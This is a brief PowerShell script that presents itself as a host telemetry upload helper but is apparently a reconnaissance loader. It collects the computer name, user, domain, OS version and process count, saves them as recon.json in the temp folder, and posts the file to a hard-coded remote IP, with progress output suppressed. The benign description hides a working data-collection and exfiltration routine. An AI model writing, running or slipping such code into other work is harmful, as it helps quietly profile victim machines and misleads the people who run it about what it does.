
<#
.SYNOPSIS
    Host telemetry upload helper.

.DESCRIPTION
    Collects a small set of host fields, encodes
    them as JSON and posts the document to the configured endpoint.

.EXAMPLE
    PS> .\loader.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://192.0.2.228/upload',
    [string]$ReportPath = "$env:TEMP\recon.json"
)
$ErrorActionPreference = "Stop"

Write-Verbose "Collecting host telemetry"
$TransferResult = [ordered]@{
    ComputerName = $env:COMPUTERNAME
    UserName = $env:USERNAME
    Domain = $env:USERDOMAIN
    OSVersion = [Environment]::OSVersion.VersionString
    ProcessCount = (Get-Process).Count
}
$TransferResult | ConvertTo-Json -Depth 3 | Out-File -FilePath $ReportPath
Write-Verbose ("Telemetry written to " + $ReportPath)
$Response = Invoke-RestMethod -Uri $PayloadUrl -Method Post -Body (Get-Content -Path $ReportPath -Raw) -ContentType "application/json"
Write-Verbose ("Upload status: " + $Response)

$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
$ProgressPreference = "SilentlyContinue"
